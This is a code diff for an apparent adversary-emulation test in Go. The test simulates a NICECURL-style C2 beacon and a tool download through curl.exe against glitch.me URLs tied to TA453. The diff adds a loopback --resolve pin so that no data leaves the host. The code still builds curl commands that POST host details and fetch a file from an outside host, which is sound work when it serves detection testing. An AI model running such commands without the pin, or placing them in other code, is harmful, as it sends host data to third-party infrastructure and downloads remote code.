@@ -37,6 +37,45 @@ const (
 	STAGE_ID       = 3
 )
 
+// C2_PIN_ADDR pins every C2 connection to loopback via curl's --resolve.
+//
+// SAFETY CONTROL — do not remove. Glitch serves ALL *.glitch.me names from a
+// wildcard DNS record pointing at its Fastly edge, so a .glitch.me subdomain can
+// never fail to resolve, whether or not the project exists. Without this pin, the
+// beacon below — which carries the real hostname and username of the host — would
+// be POSTed over the wire to third-party infrastructure on a domain associated
+// with TA453. --resolve makes curl connect to 127.0.0.1 instead, where nothing is
+// listening, so the connection is refused and no beacon data ever leaves the host.
+//
+// The real C2 URL is still what appears in curl.exe's argv, so every detection
+// signal is preserved intact: the glitch.me indicator that all five rule formats
+// match on, the NICECURL User-Agent, and the base64 beacon in -d. Those rules key
+// on process telemetry, which does not depend on the request completing.
+const C2_PIN_ADDR = "127.0.0.1"
+
+// c2ResolveFlag builds curl's --resolve argument, pinning the URL's host to
+// C2_PIN_ADDR so the request cannot reach the real endpoint.
+//
+// The port is taken from the URL when present and defaults to 443. curl applies
+// --resolve per host:port pair, so hardcoding 443 would silently stop pinning —
+// and silently restore real egress — if a C2 URL above ever gained an explicit
+// port. Deriving it keeps the safety control correct by construction.
+func c2ResolveFlag(rawURL string) string {
+	hostport := rawURL
+	if i := strings.Index(hostport, "://"); i >= 0 {
+		hostport = hostport[i+3:]
+	}
+	if i := strings.Index(hostport, "/"); i >= 0 {
+		hostport = hostport[:i]
+	}
+
+	host, port := hostport, "443"
+	if i := strings.LastIndex(hostport, ":"); i >= 0 {
+		host, port = hostport[:i], hostport[i+1:]
+	}
+	return fmt.Sprintf("%s:%s:%s", host, port, C2_PIN_ADDR)
+}
+
 const (
 	StageSuccess     = 0
 	StageBlocked     = 126
@@ -80,8 +119,9 @@ func performTechnique() error {
 	// We simulate by:
 	// a) Verifying curl.exe is available (it is on Windows 10+)
 	// b) Constructing a base64-encoded beacon payload
-	// c) Using curl.exe to attempt HTTPS connections to safe targets
-	//    that model the Glitch.me C2 pattern (connection will fail safely)
+	// c) Using curl.exe to attempt HTTPS connections to the real Glitch.me C2
+	//    pattern, pinned to loopback via --resolve so nothing leaves the host
+	//    (see C2_PIN_ADDR) — the connection is refused, by construction
 	// d) Writing the simulated C2 request/response to log
 
 	// Step 1: Locate curl.exe
@@ -150,11 +190,16 @@ func performTechnique() error {
 		LogMessage("INFO", TECHNIQUE_ID, "Detection opportunity: AES-CBC + bitwise NOT obfuscated C2 beacon matches NICECURL signature")
 	}
 
-	// Step 4: Execute curl.exe with Glitch-themed C2 endpoints
-	// These are non-existent domains that model the real C2 pattern.
-	// The DNS resolution will fail safely (no actual C2 traffic).
+	// Step 4: Execute curl.exe with Glitch-themed C2 endpoints.
+	//
+	// These are REAL, RESOLVABLE domains — Glitch wildcards all *.glitch.me to its
+	// Fastly edge, so they resolve whether or not a project exists behind them.
+	// Every request below is therefore pinned to loopback with --resolve
+	// (see C2_PIN_ADDR) so the beacon cannot reach third-party infrastructure.
+	//
 	// The key detection signal is curl.exe making HTTPS requests to suspicious
-	// domains from a script/binary context.
+	// domains from a script/binary context — that signal lives in the process
+	// command line, which is unchanged and still carries the real C2 URL.
 	c2Endpoints := []struct {
 		url  string
 		desc string
@@ -181,9 +226,10 @@ func performTechnique() error {
 		// -X POST with base64-encoded data
 		// -H with custom headers
 		cmd := exec.Command(curlPath,
-			"-s",                     // Silent mode
-			"-k",                     // Allow self-signed certs (NICECURL does this)
-			"--connect-timeout", "5", // Short timeout (will fail on non-existent domain)
+			"-s", // Silent mode
+			"-k", // Allow self-signed certs (NICECURL does this)
+			"--resolve", c2ResolveFlag(endpoint.url), // SAFETY: pin to loopback, no real egress
+			"--connect-timeout", "5", // Short timeout (connection to loopback:443 is refused)
 			"--max-time", "8", // Max total time
 			"-X", "POST", // POST method
 			"-H", "Content-Type: application/x-www-form-urlencoded",
@@ -204,14 +250,21 @@ func performTechnique() error {
 			if exitErr, ok := err.(*exec.ExitError); ok {
 				exitCode := exitErr.ExitCode()
 				LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("curl.exe exit code %d for %s (output: %s)", exitCode, endpoint.url, strings.TrimSpace(string(output))))
-				// curl exit codes: 6 = DNS failed, 7 = connection refused, 28 = timeout
-				// These are expected for non-existent domains
+				// curl exit codes: 6 = DNS failed, 7 = connection refused, 28 = timeout.
+				// Exit 7 is the EXPECTED outcome: --resolve pins the host to loopback,
+				// where nothing listens on 443. This is the safety control working, not
+				// a protection control firing — the request never left the host.
 				if exitCode == 6 || exitCode == 7 || exitCode == 28 || exitCode == 35 {
-					LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Expected curl failure (DNS/connection): exit %d", exitCode))
+					LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Expected curl failure (loopback-pinned connection refused): exit %d", exitCode))
 				}
 			} else {
-				// curl.exe could not start - possible EDR prevention
-				return fmt.Errorf("curl.exe execution was prevented: %v", err)
+				// curl.exe did not start. Per CLAUDE.md Rule 8 this is NOT by itself
+				// evidence of a protection action — a bad image path, resource
+				// exhaustion, or policy misconfiguration produce the same symptom.
+				// Describe the operation only; determineExitCode still recognizes a
+				// genuine OS-emitted denial from the wrapped error text and returns
+				// StageBlocked for it. Anything else resolves to StageError (999).
+				return fmt.Errorf("curl.exe could not be started: %w", err)
 			}
 		} else {
 			// Unexpected success (domain somehow resolved)
@@ -228,12 +281,14 @@ func performTechnique() error {
 	LogMessage("INFO", TECHNIQUE_ID, "Simulating tool transfer attempt via curl.exe (T1105)")
 
 	downloadPath := filepath.Join(stagingDir, "module_update.dat")
+	const dlURL = "https://accurate-sprout-porpoise.glitch.me/api/v2/module/update"
 	dlCmd := exec.Command(curlPath,
 		"-s", "-k",
+		"--resolve", c2ResolveFlag(dlURL), // SAFETY: pin to loopback, no real egress
 		"--connect-timeout", "5",
 		"--max-time", "8",
 		"-o", downloadPath,
-		"https://accurate-sprout-porpoise.glitch.me/api/v2/module/update",
+		dlURL,
 	)
 
 	dlOutput, dlErr := dlCmd.CombinedOutput()
@@ -295,7 +350,7 @@ func determineExitCode(err error) int {
 		return StageSuccess
 	}
 	errStr := err.Error()
-	if containsAny(errStr, []string{"access denied", "access is denied", "permission denied", "operation not permitted", "was prevented"}) {
+	if containsAny(errStr, []string{"access denied", "access is denied", "permission denied", "operation not permitted"}) {
 		return StageBlocked
 	}
 	if containsAny(errStr, []string{"quarantined", "virus", "threat"}) {
